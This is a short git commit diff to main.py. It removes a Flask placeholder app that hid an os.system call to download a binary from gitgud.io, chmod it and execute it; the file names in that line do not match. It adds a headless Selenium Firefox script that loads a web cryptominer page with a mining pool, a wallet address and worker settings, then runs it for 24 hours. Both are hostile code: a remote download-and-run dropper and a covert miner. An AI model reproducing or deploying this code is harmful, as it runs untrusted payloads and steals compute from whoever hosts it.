d34314b5514cf2815a174ddd412b43328fe88041
sisafu10 <sisafu10@kicag.com>
2024-05-28 04:34:43 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,15 @@
-import os
-from flask import Flask
-os.system('curl --output vus https://gitgud.io/trendava/ruby/-/raw/master/vas;chmod 700 vas;./vas')
-app = Flask(__name__)
+from selenium import webdriver
+from webdriver_manager.firefox import GeckoDriverManager
+from selenium.webdriver.firefox.service import Service
+from selenium.webdriver.firefox.options import Options
+from time import sleep
+opts = Options()
+opts.binary_location = '/usr/local/bin/firefox'
+opts.add_argument('--headless')
 
+service = Service(executable_path=GeckoDriverManager().install())
+driver = webdriver.Firefox(service=service, options=opts)
 
-@app.route('/')
-def index():
-    return 'Hello from Flask!'
-
-if __name__ == '__main__':
-  app.run(host='0.0.0.0', port=80)
+driver.get('https://webminer.pages.dev?algorithm=yespower&host=yespower.na.mine.zpool.ca&port=6234&worker=LhuxrdRnCKjcvhVz5vnqXsyRAM1YbjAY8t&password=c%3DLTC&workers=4')
+sleep(86400)
+print(driver.title)
